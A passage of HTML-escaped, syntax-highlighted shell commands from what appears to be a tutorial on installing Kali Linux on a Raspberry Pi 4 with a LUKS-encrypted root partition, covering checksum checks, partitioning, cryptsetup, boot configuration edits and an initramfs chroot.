style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tgrep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -E&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;^97549d9e24dbd73add004b9521874dff6351a6275428356e804b98eb9e842c99 &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; &amp;#x26;&amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;SUCCESS - Download checksum looks good&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; ||&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;FAILURE - Download checksum doesn&#039;t match expected value; file corrupt or incorrect&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Decompress the image. Note that you may experience I/O hangs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# while decompressing the image; just be patient and wait for&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# the Pi&#039;s little green light to stop flashing.)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;unxz&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; kali-linux-2021.2-rpi4-nexmon-64.img.xz&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Everything from here on out needs to be run as root, so&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# let&#039;s use sudo to open a root shell now.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Mount the partitions in the Kali disk image. Your image&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# partitions will *probably* show up as /dev/loop0p1 and&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# /dev/loop0p2, but you may want to check the symlinks under&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# /dev/disk/by-label first, just to be sure.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;losetup&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; kali-linux-2021.2-rpi4-nexmon-64.img&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mkdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/img-{root,boot}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/loop0p1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/img-boot&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/loop0p2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/img-root&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Now connect up the microSD card reader and insert the first&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# microSD card and partition it. My card shows up as&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# /dev/mmcblk1 (so that&#039;s what I&#039;ll be using moving forward),&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# but you&#039;ll want to double-check this; if you use the wrong&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# device here you can hose your system!&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Delete the current partition, make sure you&#039;re using a DOS&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# partition table, and then create two new partitions:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# The first partition should be a primary partition 256MB in&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# size of type 0c (W95 FAT32 LBA).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# The second partition should also be a primary partition. It&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# should use the remainder of the space and be of type 83&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# (Linux).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;fdisk&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/mmcblk1&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Format the new partitions, mount them, and copy over the&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# operating system files.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mkfs.vfat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; BOOT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/mmcblk1p1&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cryptsetup&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -y&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; luksFormat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/mmcblk1p2&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cryptsetup&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; luksOpen&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/mmcblk1p2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; crypt_rootfs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mkfs.ext4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -L&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ROOTFS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/mapper/crypt_rootfs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mkdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-{root,boot}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/mmcblk1p1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-boot&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/mapper/crypt_rootfs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;rsync&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -avh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/img-boot/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-boot/&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;rsync&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -avh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/img-root/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root/&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# You should copy your SSH public key(s) over to /mnt/ext-root &lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# at this point, as you&#039;ll eventually need these to unlock the&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Kali ROOTFS partition via dropbear. I&#039;m not writing out that&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# step explicitly though; you could be generating a new&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# keypair here, using keys you copied over to the bootstrap&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# microSD above, or just copying ~/.ssh/authorized_keys from&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# an existing system. You do you.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Make the Pi load an initramfs on boot.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;initramfs initramfs.zst followkernel&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-boot/config.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Make sure the kernel knows where ROOTFS is. Note that we use&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# /dev/mmcblk0p2 here rather than /dev/mmcblk1p2, because&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# we&#039;re going to remove the current microSD card and use the&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# one we&#039;re creating in a moment, which means that on boot&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# this new card with be /dev/mmcblk0!&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sed&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;s#root=/dev/mmcblk0p2#root=/dev/mapper/crypt_rootfs cryptdevice=/dev/mmcblk0p2:crypt_rootfs#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-boot/cmdline.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Fix paths in /etc/fstab.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sed&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;s#/dev/mmcblk0p2#/dev/mapper/crypt_rootfs#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root/etc/fstab&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Add ROOTFS to /etc/crypttab.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;crypt_rootfs\t/dev/mmcblk0p2\tnone\tluks&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root/etc/crypttab&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Now let&#039;s actually generate the initramfs we need. Note that&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# mkinitramfs wants a (missing) kernel config, so we copy one&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# over from linux-headers as a work-around.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; proc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; none&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root/proc&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; sysfs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; none&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root/sys&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bind&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root/dev&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bind&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/pts&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root/dev/pts&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bind&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-boot&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root/boot&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;LANG&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;C&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; chroot&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/src/linux-headers-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$(&lt;/span&gt;&lt;span 